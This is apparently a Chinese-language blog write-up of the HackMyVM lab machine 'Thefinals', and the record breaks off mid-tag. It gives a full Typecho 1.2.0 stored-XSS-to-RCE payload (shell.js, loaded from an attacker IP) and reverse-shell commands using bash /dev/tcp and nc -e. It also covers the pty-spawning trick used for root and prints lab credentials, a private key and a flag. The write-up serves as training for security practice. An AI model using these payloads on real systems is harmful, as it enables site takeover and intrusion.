{"pageProps":{"postData":{"id":"HackMyVMThefinals","contentHtml":"<h1>Thefinals.</h1>\n<blockquote>\n<p><a href=\"https://hackmyvm.eu/machines/machine.php?vm=Thefinals\">https://hackmyvm.eu/machines/machine.php?vm=Thefinals</a></p>\n</blockquote>\n<p>Notes：<strong>Please wait for the IP to appear on the screen and then start. If it doesn't boot, please enable EFI in settings.</strong></p>\n<h2>前期踩点</h2>\n<pre><code class=\"hljs language-bash\">➜  Thefinals nmap -sP 192.168.56.0/24\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-02 05:41 EDT\nStats: 0:00:00 elapsed; 0 hosts completed (0 up), 255 undergoing ARP Ping Scan\nARP Ping Scan Timing: About 2.35% <span class=\"hljs-keyword\">done</span>; ETC: 05:41 (0:00:00 remaining)\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.1\nHost is up (0.00036s latency).\nMAC Address: 0A:00:27:00:00:09 (Unknown)\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.2\nHost is up (0.00025s latency).\nMAC Address: 08:00:27:65:02:A9 (Oracle VirtualBox virtual NIC)\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.56\nHost is up (0.00050s latency).\nMAC Address: 08:00:27:73:DF:E3 (Oracle VirtualBox virtual NIC)\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.4\nHost is up.\nNmap <span class=\"hljs-keyword\">done</span>: 256 IP addresses (4 hosts up) scanned <span class=\"hljs-keyword\">in</span> 1.97 seconds\n</code></pre>\n<pre><code class=\"hljs language-bash\">➜  Thefinals nmap -sT -min-rate 10000 -p- 192.168.56.56  \nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-02 08:07 EDT\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.56\nHost is up (0.00070s latency).\nNot shown: 65533 closed tcp ports (conn-refused)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\nMAC Address: 08:00:27:73:DF:E3 (Oracle VirtualBox virtual NIC)\n\nNmap <span class=\"hljs-keyword\">done</span>: 1 IP address (1 host up) scanned <span class=\"hljs-keyword\">in</span> 4.37 seconds\n</code></pre>\n<pre><code class=\"hljs language-bash\">➜  Thefinals nmap -sT -A -T4 -O -p 22,80 192.168.56.56 \nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-02 08:08 EDT\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.56\nHost is up (0.00069s latency).\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 9.9 (protocol 2.0)\n| ssh-hostkey: \n|   256 42:a7:04:bb:da:b5:8e:71:7a:89:ff:a4:60:<span class=\"hljs-built_in\">cd</span>:4d:29 (ECDSA)\n|_  256 37:32:71:ca:3f:11:41:b4:d7:90:1e:c9:7f:e8:bc:20 (ED25519)\n80/tcp open  http    Apache httpd 2.4.62 ((Unix))\n| http-methods: \n|_  Potentially risky methods: TRACE\n|_http-title: THE FINALS\n|_http-server-header: Apache/2.4.62 (Unix)\nMAC Address: 08:00:27:73:DF:E3 (Oracle VirtualBox virtual NIC)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice <span class=\"hljs-built_in\">type</span>: general purpose\nRunning: Linux 4.X|5.X\nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5\nOS details: Linux 4.15 - 5.8\nNetwork Distance: 1 hop\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   0.69 ms 192.168.56.56\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap <span class=\"hljs-keyword\">done</span>: 1 IP address (1 host up) scanned <span class=\"hljs-keyword\">in</span> 8.95 seconds\n</code></pre>\n<h2>Web 渗透</h2>\n<h3>信息收集</h3>\n<p>访问<code>HTTP</code>并采集指纹，在下方能找到<code>THEFINALS.hmv</code> 添加到<code>hosts</code>文件</p>\n<p><img src=\"/post-images/HackMyVMThefinals/image.png\" alt=\"image.png\"></p>\n<p>信息收集一波，先扫描一波目录</p>\n<pre><code class=\"hljs language-bash\">➜  Thefinals gobuster <span class=\"hljs-built_in\">dir</span> -u http://thefinals.hmv/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,zip -b 403,404,301 \n===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) &#x26; Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://thefinals.hmv/\n[+] Method:                  GET\n[+] Threads:                 10\n[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\n[+] Negative Status codes:   403,404,301\n[+] User Agent:              gobuster/3.6\n[+] Extensions:              php,txt,html,zip\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster <span class=\"hljs-keyword\">in</span> directory enumeration mode\n===============================================================\n/index.html           (Status: 200) [Size: 15280]\nProgress: 1102800 / 1102805 (100.00%)\n===============================================================\nFinished\n===============================================================\n</code></pre>\n<pre><code class=\"hljs language-bash\">➜  Thefinals dirsearch -u http://thefinals.hmv -x 403,404,429 -e php,zip,txt\n/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html\n  from pkg_resources import DistributionNotFound, VersionConflict\n\n  _|. _ _  _  _  _ _|_    v0.4.3\n (_||| _) (/_(_|| (_| )\n\nExtensions: php, zip, txt | HTTP method: GET | Threads: 25 | Wordlist size: 10439\n\nOutput File: /root/Desktop/test/Thefinals/reports/http_thefinals.hmv/_25-05-02_22-34-19.txt\n\nTarget: http://thefinals.hmv/\n\n[22:34:19] Starting: \n[22:34:37] 301 -  311B  - /blog  ->  http://thefinals.hmv/blog/\n[22:34:37] 200 -   17KB - /blog/\n[22:34:38] 200 -  820B  - /cgi-bin/printenv\n[22:34:38] 200 -    1KB - /cgi-bin/test-cgi\n[22:34:41] 301 -  310B  - /css  ->  http://thefinals.hmv/css/\n[22:34:46] 301 -  312B  - /fonts  ->  http://thefinals.hmv/fonts/\n[22:34:49] 301 -  313B  - /images  ->  http://thefinals.hmv/images/\n[22:34:49] 200 -  606B  - /images/\n[22:34:51] 301 -  309B  - /js  ->  http://thefinals.hmv/js/\n[22:34:51] 200 -  694B  - /js/\n[22:35:05] 301 -  318B  - /screenshots  ->  http://thefinals.hmv/screenshots/\n\nTask Completed\n</code></pre>\n<p>令人感兴趣的 <code>screenshot</code> 目录</p>\n<p><img src=\"/post-images/HackMyVMThefinals/image1.png\" alt=\"image.png\"></p>\n<p>随便挑几张都是一样的，能知道 <code>Typeecho</code> 版本是 <code>1.20</code></p>\n<p><img src=\"/post-images/HackMyVMThefinals/image2.png\" alt=\"image.png\"></p>\n<p>将所有图片下载下载</p>\n<pre><code class=\"hljs language-bash\">➜  Thefinals wget -r -l 1 -A png http://thefinals.hmv/screenshots/\n</code></pre>\n<p>根据大小排序后，但是也没找到有用的信息</p>\n<pre><code class=\"hljs language-bash\">➜  screenshots <span class=\"hljs-built_in\">ls</span> -al | grep -v 31556 \n总计 7344\ndrwxr-xr-x 2 root root 12288  5月 2日 22:48 .\ndrwxr-xr-x 3 root root  4096  5月 2日 22:48 ..\n-rw-r--r-- 1 root root 31554  5月 2日 05:28 1746178083.png\n-rw-r--r-- 1 root root 31554  5月 2日 06:54 1746183243.png\n-rw-r--r-- 1 root root 31554  5月 2日 07:10 1746184203.png\n-rw-r--r-- 1 root root 31554  5月 2日 07:36 1746185763.png\n-rw-r--r-- 1 root root 31554  5月 2日 07:54 1746186843.png\n-rw-r--r-- 1 root root 31554  5月 2日 08:30 1746189003.png\n-rw-r--r-- 1 root root 31554  5月 2日 08:58 1746190683.png\n-rw-r--r-- 1 root root 31554  5月 2日 22:45 1746240303.png\n</code></pre>\n<p>从公开漏洞下手，直接搜索 <code>typecho 1.2.0</code> 可以找到存在存储型 <code>XSS</code></p>\n<h3>存储型 XSS</h3>\n<p>EXP：<a href=\"https://www.cnblogs.com/superwinner/p/17349526.html\">https://www.cnblogs.com/superwinner/p/17349526.html</a> | <a href=\"https://blog.csdn.net/m0_73299839/article/details/131939670\">https://blog.csdn.net/m0_73299839/article/details/131939670</a> | <a href=\"https://blog.mo60.cn/index.php/archives/Typecho-1-2-xss2rce.html\">https://blog.mo60.cn/index.php/archives/Typecho-1-2-xss2rce.html</a> (EXP在最后一个博客里面，其他博客的EXP路径有问题)</p>\n<pre><code class=\"hljs language-bash\">// EXP:shell.js\n<span class=\"hljs-keyword\">function</span> <span class=\"hljs-function\"><span class=\"hljs-title\">insertIframe</span></span>() {\n    // 获取当前页面路径\n    var urlWithoutDomain = window.location.pathname;\n    // 判断页面是否为评论管理页面\n    var hasManageComments = urlWithoutDomain.includes(<span class=\"hljs-string\">\"manage-comments.php\"</span>);\n    var tSrc=<span class=\"hljs-string\">''</span>;\n    <span class=\"hljs-keyword\">if</span> (hasManageComments){\n        // 如果是，则将路径修改为用于修改主题文件的页面地址\n        tSrc=urlWithoutDomain.replace(<span class=\"hljs-string\">'manage-comments.php'</span>,<span class=\"hljs-string\">'theme-editor.php?theme=default&#x26;file=404.php'</span>);\n    }<span class=\"hljs-keyword\">else</span>{\n        // 如果不是，则直接使用主题文件修改页面地址\n        tSrc=<span class=\"hljs-string\">'/admin/theme-editor.php?theme=default&#x26;file=404.php'</span>;\n    }\n    // 定义iframe元素的属性，包括<span class=\"hljs-built_in\">id</span>、src、width、height和onload事件\n    var iframeAttributes = <span class=\"hljs-string\">\"&#x3C;iframe id='theme_id' src='\"</span>+tSrc+<span class=\"hljs-string\">\"' width='0%' height='0%' onload='writeShell()'>&#x3C;/iframe>\"</span>;\n    // 获取网页原始内容\n    var originalContent = document.body.innerHTML;\n    // 在网页末尾添加iframe元素\n    document.body.innerHTML = (originalContent + iframeAttributes);\n}\n\n// 定义一个全局变量isSaved，初始值为<span class=\"hljs-literal\">false</span>\nvar isSaved = <span class=\"hljs-literal\">false</span>;\n\n// 定义一个函数，在iframe中写入一段PHP代码并保存\n<span class=\"hljs-keyword\">function</span> <span class=\"hljs-function\"><span class=\"hljs-title\">writeShell</span></span>() {\n    // 如果isSaved为<span class=\"hljs-literal\">false</span>\n    <span class=\"hljs-keyword\">if</span> (!isSaved) { \n        // 获取iframe内的内容区域和“保存文件”按钮元素\n        var content = document.getElementById(<span class=\"hljs-string\">'theme_id'</span>).contentWindow.document.getElementById(<span class=\"hljs-string\">'content'</span>);\n        var btns = document.getElementById(<span class=\"hljs-string\">'theme_id'</span>).contentWindow.document.getElementsByTagName(<span class=\"hljs-string\">'button'</span>);    \n        // 获取模板文件原始内容\n        var oldData = content.value;\n        // 在原始内容前加入一段phpinfo代码\n        content.value = (<span class=\"hljs-string\">'&#x3C;?php phpinfo(); ?>\\n'</span>) + oldData;\n        // 点击“保存文件”按钮\n        btns[1].click();\n        // 将isSaved设为<span class=\"hljs-literal\">true</span>，表示已经完成写入操作\n        isSaved = <span class=\"hljs-literal\">true</span>;\n    }\n}\n// 调用insertIframe函数，向网页中添加iframe元素和写入PHP代码的事件\ninsertIframe();\n</code></pre>\n<pre><code class=\"hljs language-bash\">http://a.b/<span class=\"hljs-string\">\">&#x3C;/a>&#x3C;script/src=http://192.168.56.4:2131/shell.js>&#x3C;/script>&#x3C;a/href=\"</span>#\n</code></pre>\n<p>随便点开一篇文章进行评论：</p>\n<p><img src=\"/post-images/HackMyVMThefinals/image3.png\" alt=\"image.png\"></p>\n<p>提交后可以看到服务器访问我们的服务器</p>\n<p><img src=\"/post-images/HackMyVMThefinals/image4.png\" alt=\"image.png\"></p>\n<p>验证是否利用成功</p>\n<p><img src=\"/post-images/HackMyVMThefinals/image5.png\" alt=\"image.png\"></p>\n<h3>RCE</h3>\n<p>修改EXP文件，写入反弹 <code>shell</code> 语句</p>\n<pre><code class=\"hljs language-bash\"><span class=\"hljs-built_in\">exec</span>(<span class=\"hljs-string\">\"/bin/bash -c \\'bash -i >&#x26; /dev/tcp/192.168.56.4/1234 0>&#x26;1\\'\"</span>\n</code></pre>\n<p>发现没办法进行反弹，测试是否存在 <code>nc</code></p>\n<pre><code class=\"hljs language-bash\"><span class=\"hljs-built_in\">exec</span>(<span class=\"hljs-string\">\"nc 192.168.56.4 1234\"</span>)\n</code></pre>\n<p><img src=\"/post-images/HackMyVMThefinals/image6.png\" alt=\"image.png\"></p>\n<p>存在，再尝试构造反弹</p>\n<pre><code class=\"hljs language-bash\"><span class=\"hljs-built_in\">exec</span>(<span class=\"hljs-string\">\"nc 192.168.56.4 1234 -e /bin/sh\"</span>)\n</code></pre>\n<p>我们在<code>phpinfo</code>信息中可以看到系统是<code>Alpine Linux</code> 并且<code>Alpine Linux</code> 的默认 <code>Shell</code> 并不是 <code>Bash</code> 或者 <code>zsh</code> 而是 <code>ash</code></p>\n<p>最后通过弹 <code>/bin/ash</code> 获取 <code>shell</code></p>\n<pre><code class=\"hljs language-bash\"><span class=\"hljs-built_in\">exec</span>(<span class=\"hljs-string\">\"nc 192.168.56.4 1234 -e /bin/ash\"</span>)\n</code></pre>\n<p><img src=\"/post-images/HackMyVMThefinals/image7.png\" alt=\"image.png\"></p>\n<h2>提权 - To scotty</h2>\n<h3>信息收集</h3>\n<p>再 <code>june</code> 用户家目录能找到 <code>user.txt</code></p>\n<pre><code class=\"hljs language-bash\">/home/june $ <span class=\"hljs-built_in\">cat</span> user.flag \nwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww\nwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww\nwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww\nwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww\nwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww\nwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww\nwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwqpppqwmwqpppqwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww\nwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwqpmJx)-&#x3C;!l!&#x3C;-(nCwpqwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww\nwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwqpQ\\!<span class=\"hljs-string\">'           `>jZpwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww\nwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwpmt,                 luqqwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww\nwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwqqzi                    .?Lpqwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww\nwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwpQ[.                       \"tmpwwwwwwwwwwwwwwwwwwwwwwwwwwwwww\nwwwwwwwwwwwwwwwwwwwwwwwwwwwwwpmf,                           >Xpqwwwwwwwwwwwwwwwwwwwwwwwwwwww\nwwwwwwwwwwwwwwwwwwwwwwwwwwwqpX>                              '</span>{0pwwwwwwwwwwwwwwwwwwwwwwwwwww\nwwwwwwwwwwwwwwwwwwwwwwwwwwpQ}<span class=\"hljs-string\">'               l>                ;xqqwwwwwwwwwwwwwwwwwwwwwwwww\nwwwwwwwwwwwwwwwwwwwwwwwwpwj:                -mwt\"                _Jpqwwwwwwwwwwwwwwwwwwwwwww\nwwwwwwwwwwwwwwwwwwwwwwqpX&#x3C;                  \"(ZbQ?.               ^|Zpwwwwwwwwwwwwwwwwwwwwww\nwwwwwwwwwwwwwwwwwwwwwp0{'</span>                     lvppvl                !vqqwwwwwwwwwwwwwwwwwwww\nwwwwwwwwwwwwwwwwwwwqwr:                        .]QbZ(`               .[Qpwwwwwwwwwwwwwwwwwww\nwwwwwwwwwwwwwwwwwqpY~                            :jqdU+                ,fwqwwwwwwwwwwwwwwwww\nwwwwwwwwwwwwwwwwp01<span class=\"hljs-string\">'                               +Udqj:                ~Ypqwwwwwwwwwwwwwww\nwwwwwwwwwwwwwwqwr;               '</span>_:                ^|ZbQ}.               <span class=\"hljs-string\">')Opwwwwwwwwwwwwww\nwwwwwwwwwwwwqpU+                >zpQ}'</span>                !cppc!                Inqqwwwwwwwwwwww\nwwwwwwwwwwwpO)`               ,fmpwqpz>                .}0bm\\^                ?Cpqwwwwwwwwww\nwwwwwwwwwqqx;               <span class=\"hljs-string\">'[Qpqwwwwpmf,                :rqdC_                \"/mpwwwwwwwww\nwwwwwwwqpJ_                izqqwwwwwwwwpQ}'</span>                _Jdqx;                >zpqwwwwwww\nwwwwwwpO(`               ,fmpwwwwwwwwwwwqpz>                ^\\md01<span class=\"hljs-string\">'               '</span>}0pwwwwww\nwwwwwmnI               <span class=\"hljs-string\">'[Qpqwwwwwwwwwwwwwwpmf,                !cqpX&#x3C;                :rmwwwww\nwwwwwZcvccccccccccccccvUqqwwwwwwwwwwwwwwwwwwpQccccccccccccccccvXmwpmzcccccccccccccccvcOwwwww\nwwwwwwqppppppppppppppppqwwwwwwwwwwwwwwwwwwwwwqpppppppppppppppppqwwwwqppppppppppppppppqwwwwww\nwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww\nwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww\nwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww\nwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww\nwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww\nwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww\n\nflag{4b5d61daf3e2e5ba57019f617012ad0919c2a6c29e11912aeadef2820be8f298}\n</span></code></pre>\n<p>查看<code>CMS</code>配置文件</p>\n<pre><code class=\"hljs language-bash\">// config db\n<span class=\"hljs-variable\">$db</span> = new \\Typecho\\Db(<span class=\"hljs-string\">'Pdo_Mysql'</span>, <span class=\"hljs-string\">'typecho_'</span>);\n<span class=\"hljs-variable\">$db</span>->addServer(array (\n  <span class=\"hljs-string\">'host'</span> => <span class=\"hljs-string\">'localhost'</span>,\n  <span class=\"hljs-string\">'port'</span> => 3306,\n  <span class=\"hljs-string\">'user'</span> => <span class=\"hljs-string\">'typecho_u'</span>,\n  <span class=\"hljs-string\">'password'</span> => <span class=\"hljs-string\">'QLTkbviW71CSRZtGWIQdB6s'</span>,\n  <span class=\"hljs-string\">'charset'</span> => <span class=\"hljs-string\">'utf8mb4'</span>,\n  <span class=\"hljs-string\">'database'</span> => <span class=\"hljs-string\">'typecho_db'</span>,\n  <span class=\"hljs-string\">'engine'</span> => <span class=\"hljs-string\">'InnoDB'</span>,\n), \\Typecho\\Db::READ | \\Typecho\\Db::WRITE);\n\\Typecho\\Db::<span class=\"hljs-built_in\">set</span>(<span class=\"hljs-variable\">$db</span>);\n</code></pre>\n<p>登录数据库，并寻找有趣的信息</p>\n<pre><code class=\"hljs language-bash\">/home/june $ mysql -u typecho_u -p\nmysql: Deprecated program name. It will be removed <span class=\"hljs-keyword\">in</span> a future release, use <span class=\"hljs-string\">'/usr/bin/mariadb'</span> instead\nEnter password: \nWelcome to the MariaDB monitor.  Commands end with ; or \\g.\nYour MariaDB connection <span class=\"hljs-built_in\">id</span> is 4109\nServer version: 11.4.5-MariaDB Alpine Linux\n\nCopyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.\n\nType <span class=\"hljs-string\">'help;'</span> or <span class=\"hljs-string\">'\\h'</span> <span class=\"hljs-keyword\">for</span> <span class=\"hljs-built_in\">help</span>. Type <span class=\"hljs-string\">'\\c'</span> to clear the current input statement.\n\nMariaDB [(none)]> \n</code></pre>\n<pre><code class=\"hljs language-bash\">MariaDB [typecho_db]> <span class=\"hljs-keyword\">select</span> * from typecho_users;\n+-----+-------+------------------------------------+---------------------+---------------------------+------------+------------+------------+------------+---------------+----------------------------------+\n| uid | name  | password                           | mail                | url                       | screenName | created    | activated  | logged     | group         | authCode                         |\n+-----+-------+------------------------------------+---------------------+---------------------------+------------+------------+------------+------------+---------------+----------------------------------+\n|   1 | staff | $P<span class=\"hljs-variable\">$B</span>/qMMS9FETOrEZ38X0YDY5gKJOyiwQ1 | staff@thefinals.hmv | http://thefinals.hmv/blog | staff      | 1743647281 | 1746272580 | 1746272521 | administrator | 213944c56e829e2cf7ec1de863ac3c03 |\n+-----+-------+------------------------------------+---------------------+---------------------------+------------+------------+------------+------------+---------------+----------------------------------+\n1 row <span class=\"hljs-keyword\">in</span> <span class=\"hljs-built_in\">set</span> (0.000 sec)\n</code></pre>\n<p>尝试爆破后没爆破出来</p>\n<h3>猜谜游戏</h3>\n<p><code>june</code> 用户家目录下 <code>message.txt</code></p>\n<pre><code class=\"hljs language-bash\">/home/june $ <span class=\"hljs-built_in\">cat</span> message.txt \nContestants, gear up and get ready! Who<span class=\"hljs-string\">'s got the KEY? Who'</span>s got the the guts?\n                                                              --- This BROADCAST has been hacked by CNS\n</code></pre>\n<p>猜谜？尝试寻找于各用户相关的文件</p>\n<pre><code class=\"hljs language-bash\">$ find / -user xxxx 2>/dev/null\n</code></pre>\n<p>如何通过执行 scotty 用户可以找到如下文件</p>\n<pre><code class=\"hljs language-bash\">$ find / -user scotty 2>/dev/null\n</code></pre>\n<pre><code class=\"hljs language-bash\">/var/log/scotty-main.err\n/var/log/scotty-main.log\n</code></pre>\n<p>查看 <code>/var/log/scotty-main.log</code> ，表示向目标主机 <code>192.168.56.57</code> 的 <code>1337</code> 端口发送了广播数据包（UDP 或特定协议探测）。</p>\n<pre><code class=\"hljs language-bash\">// /var/log/scotty-main.log\nBroadcast to eth0 192.168.56.57:1337\nBroadcast to eth0 192.168.56.57:1337\nBroadcast to eth0 192.168.56.57:1337\n</code></pre>\n<p>通过 <code>nc</code> 接收</p>\n<pre><code class=\"hljs language-bash\">/home $ nc -ulnvp 1337\nlistening on [::]:1337 ...\nconnect to [::ffff:192.168.56.57]:1337 from [::ffff:192.168.56.57]:40599 ([::ffff:192.168.56.57]:40599)\nLS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFNd0FBQUF0emMyZ3RaVwpReU5UVXhPUUFBQUNBMXduMDk0cGhPcXNmYm8rbzNDQllpTjN4QTE2eW1LU2JYMlVZMzJ4L0FFd0FBQUpnRGMvWVVBM1AyCkZBQUFBQXR6YzJndFpXUXlOVFV4T1FBQUFDQTF3bjA5NHBoT3FzZmJvK28zQ0JZaU4zeEExNnltS1NiWDJVWTMyeC9BRXcKQUFBRUN2N2tmZW9YT1FDaTVDUklXZEhpRFQ1dXBLeVkzdlF4QWxLbXhFUXpSWkxEWENmVDNpbUU2cXg5dWo2amNJRmlJMwpmRURYcktZcEp0ZlpSamZiSDhBVEFBQUFFbkp2YjNSQWRHaGxabWx1WVd4ekxtaHRkZ0VDQXc9PQotLS0tLUVORCBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0K\n</code></pre>\n<p><img src=\"/post-images/HackMyVMThefinals/image8.png\" alt=\"image.png\"></p>\n<p>看着像是 <code>base64</code> 编码后的，尝试解码。解码后是一串私钥。</p>\n<p><img src=\"/post-images/HackMyVMThefinals/image9.png\" alt=\"image.png\"></p>\n<p>最后通过私钥成功登陆上去</p>\n<pre><code class=\"hljs language-bash\">➜  Thefinals vim sshkey  \n➜  Thefinals <span class=\"hljs-built_in\">chmod</span> 600 sshkey                                         \n➜  Thefinals ssh scotty@thefinals.hmv -i sshkey \nThe authenticity of host <span class=\"hljs-string\">'thefinals.hmv (192.168.56.57)'</span> can<span class=\"hljs-string\">'t be established.\nED25519 key fingerprint is SHA256:EzmhY2U9+FvurEu825jyirPaiFVcHNA2joTW03K3glk.\nThis key is not known by any other names.\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nWarning: Permanently added '</span>thefinals.hmv<span class=\"hljs-string\">' (ED25519) to the list of known hosts.\n\nthefinals:~$ whoami\nscotty\n</span></code></pre>\n<h2>提权 - To root</h2>\n<h3>信息收集</h3>\n<p>查看 sudo 权限，免密码以 root 权限执行 <code>secret</code></p>\n<pre><code class=\"hljs language-bash\">thefinals:~$ <span class=\"hljs-built_in\">sudo</span> -l\nMatching Defaults entries <span class=\"hljs-keyword\">for</span> scotty on thefinals:\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nRunas and Command-specific defaults <span class=\"hljs-keyword\">for</span> scotty:\n    Defaults!/usr/sbin/visudo env_keep+=<span class=\"hljs-string\">\"SUDO_EDITOR EDITOR VISUAL\"</span>\n\nUser scotty may run the following commands on thefinals:\n    (ALL) NOPASSWD: /sbin/secret\n</code></pre>\n<h3>获得数据库密码 &#x26; root 密码</h3>\n<p>但是没找到有什么用</p>\n<pre><code class=\"hljs language-bash\">thefinals:~$ <span class=\"hljs-built_in\">sudo</span> /sbin/secret\n/sbin/secret: line 2: can<span class=\"hljs-string\">'t create /dev/pts/99: Permission denied\nthefinals:~$ ls -al /sbin/secret \n-rwx-----x    1 root     root            51 Apr 23 17:17 /sbin/secret\n</span></code></pre>\n<p>但是有一条信息</p>\n<pre><code class=\"hljs language-bash\">can<span class=\"hljs-string\">'t create /dev/pts/99: Permission denied\n</span></code></pre>\n<p>我们查看一下 <code>/dev/pts/</code> ，只有 <code>0</code> 和 <code>1</code></p>\n<pre><code class=\"hljs language-bash\">thefinals:~$ <span class=\"hljs-built_in\">ls</span> -al /dev/pts\ntotal 0\ndrwxr-xr-x    2 root     root             0 May  3 13:24 .\ndrwxr-xr-x   14 root     root          2840 May  3 13:25 ..\ncrw--w----    1 apache   <span class=\"hljs-built_in\">tty</span>       136,   0 May  3 20:08 0\ncrw--w----    1 scotty   <span class=\"hljs-built_in\">tty</span>       136,   1 May  3 20:22 1\nc---------    1 root     root        5,   2 May  3 13:24 ptmx\n</code></pre>\n<p>我们通过 <code>python</code> 生成伪终端后，<code>/dev/pts/</code> 就多了一个</p>\n<p><img src=\"/post-images/HackMyVMThefinals/image10.png\" alt=\"image.png\"></p>\n<p>现在可以使用脚本或者手动生成</p>\n<pre><code class=\"hljs language-bash\"><span class=\"hljs-meta\">#!/bin/ash</span>\n<span class=\"hljs-comment\"># 文件名: spawn_shells.sh</span>\n<span class=\"hljs-comment\"># 用途：循环生成交互式 Shell（测试或特殊场景用）</span>\n\ncount=0\n<span class=\"hljs-keyword\">while</span> [ <span class=\"hljs-variable\">$count</span> -lt 90 ]\n<span class=\"hljs-keyword\">do</span>\n  <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"生成第 <span class=\"hljs-subst\">$((count+1)</span>) 个 Shell...\"</span>\n  python -c <span class=\"hljs-string\">'import pty; pty.spawn(\"/bin/sh\")'</span> &#x26;\n  count=$((count+<span class=\"hljs-number\">1</span>))\n<span class=\"hljs-keyword\">done</span>\n\n<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"已完成 90 次 Shell 生成。\"</span>\n</code></pre>\n<p>生成到<code>98</code>后停止，然后执行 <code>secret</code></p>\n<pre><code class=\"hljs language-bash\">thefinals:/tmp$ <span class=\"hljs-built_in\">sudo</span> /sbin/secret \nroot:p8RuoQGTtlKLAjuF1Tpy5wX\n</code></pre>\n<p>本以为是 <code>root</code> 的密码，没想到是数据库的，寻找数据，获得 <code>root</code> 密码</p>\n<pre><code class=\"hljs language-bash\">MariaDB [secret]> <span class=\"hljs-keyword\">select</span> * from user;\n+----+----------+-------------------------+\n| <span class=\"hljs-built_in\">id</span> | username | password                |\n+----+----------+-------------------------+\n|  1 | root     | BvIpFDyB4kNbkyqJGwMzLcK |\n+----+----------+-------------------------+\n1 row <span class=\"hljs-keyword\">in</span> <span class=\"hljs-built_in\">set</span> (0.000 sec)\n</code></pre>\n<pre><code class=\"hljs language-bash\">thefinals:/tmp$ su root\nPassword: \n/tmp <span class=\"hljs-comment\"># id</span>\nuid=0(root) gid=0(root) <span class=\"hljs-built_in\">groups</span>=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)\n</code></pre>\n<pre><code class=\"hljs language-bash\">~ <span 